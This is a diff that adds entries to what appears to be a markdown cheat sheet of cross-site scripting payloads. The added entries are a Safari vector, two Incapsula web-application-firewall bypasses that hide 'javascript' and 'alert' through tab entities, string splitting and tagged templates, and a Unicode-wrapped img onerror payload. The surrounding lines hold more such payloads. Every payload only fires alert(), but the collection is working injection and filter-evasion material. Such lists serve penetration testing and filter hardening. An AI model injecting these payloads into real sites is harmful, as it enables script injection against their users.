@@ -26,6 +26,12 @@
 <x>%00%00%00%00%00%00%00<script>alert(1)</script>
 ```
 
+**Safari XSS Vector** by [@mramydnei](https://twitter.com/mramydnei/status/902470271327551489)
+
+```html
+<script>location.href;'javascript:alert%281%29'</script>
+```
+
 **XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 
 ```
@@ -56,6 +62,16 @@ Note: This kind of depends on what security level the application is set to. See
 
 ```html
 >><marquee loop=1 width=0 onfinish=alert(1)>
+```
+
+**Incapsula WAF Bypasses** by [@i_bo0om](https://twitter.com/i_bo0om)
+
+```html
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+```
+
+```html
+<img/src=q onerror='new Function`al\ert\`1\``'>
 ```
 
 **jQuery < 3.0.0 XSS**
@@ -114,6 +130,12 @@ XSS[JavaScript:alert(1)]
 `Test link`__.
 
 __ javascript:alert(document.domain)  
+```
+
+**Unicode characters**
+
+```html
+†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€
 ```
 
 **AngularJS Template Injection based XSS**
